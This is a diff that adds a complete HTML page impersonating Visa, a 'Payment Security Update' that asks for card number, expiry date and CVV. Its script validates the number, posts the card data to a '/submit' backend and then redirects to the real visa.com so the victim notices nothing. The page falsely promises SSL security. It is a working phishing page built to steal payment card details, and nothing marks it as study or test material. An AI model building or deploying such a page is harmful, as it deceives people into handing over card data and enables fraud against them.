@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Payment Security Update - Visa</title>
+    <style>
+        body { background: #f5f7fa; font-family: 'Helvetica Neue', sans-serif; }
+        .container { 
+            background: white; 
+            width: 400px; 
+            padding: 2rem; 
+            border-radius: 10px; 
+            box-shadow: 0 2px 15px rgba(0,0,0,0.1);
+            margin: 50px auto;
+        }
+        .visa-logo { width: 80px; margin-bottom: 20px; }
+        .input-group { margin: 15px 0; }
+        input { 
+            width: 100%; 
+            padding: 12px; 
+            border: 1px solid #ddd; 
+            border-radius: 4px; 
+            font-size: 16px;
+        }
+        button { 
+            background: #1a1f71; 
+            color: white; 
+            padding: 12px 20px; 
+            border: none; 
+            border-radius: 4px; 
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" 
+             alt="Visa Logo" 
+             class="visa-logo">
+        <h2>Security Verification Required</h2>
+        <form id="paymentForm">
+            <div class="input-group">
+                <input type="text" 
+                       name="cardNumber" 
+                       placeholder="Card Number" 
+                       required 
+                       pattern="\d{13,19}"
+                       title="Valid Visa/Mastercard number">
+            </div>
+            <div class="input-group">
+                <input type="month" 
+                       name="expiry" 
+                       placeholder="MM/YYYY" 
+                       required>
+            </div>
+            <div class="input-group">
+                <input type="text" 
+                       name="cvv" 
+                       placeholder="CVV" 
+                       required 
+                       pattern="\d{3,4}">
+            </div>
+            <button type="submit">Verify Card</button>
+        </form>
+        <p style="font-size: 12px; color: #666; margin-top: 20px;">
+            <img src="lock-icon.png" alt="Secure" style="height: 14px;">
+            Your information is secured with 256-bit SSL encryption
+        </p>
+    </div>
+
+    <script>
+        document.getElementById('paymentForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+         
+            const validateCard = num => {
+                let sum = 0;
+                for(let i=0; i<num.length; i++) {
+                    let digit = parseInt(num[i]);
+                    if((i - num.length) % 2 === 0) digit *= 2;
+                    if(digit > 9) digit -= 9;
+                    sum += digit;
+                }
+                return sum % 10 === 0;
+            };
+
+            if(!validateCard(e.target.cardNumber.value)) {
+                alert('Invalid card number - please check');
+                return;
+            }
+
+            // Submit data to Flask backend
+            const data = {
+                cardNumber: e.target.cardNumber.value,
+                expiry: e.target.expiry.value,
+                cvv: e.target.cvv.value
+            };
+
+            try {
+                await fetch('/submit', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                window.location.href = 'https://www.visa.com/';
+            } catch(err) {
+                alert('Verification failed - please try again');
+            }
+        });
+    </script>
+</body>
+</html>
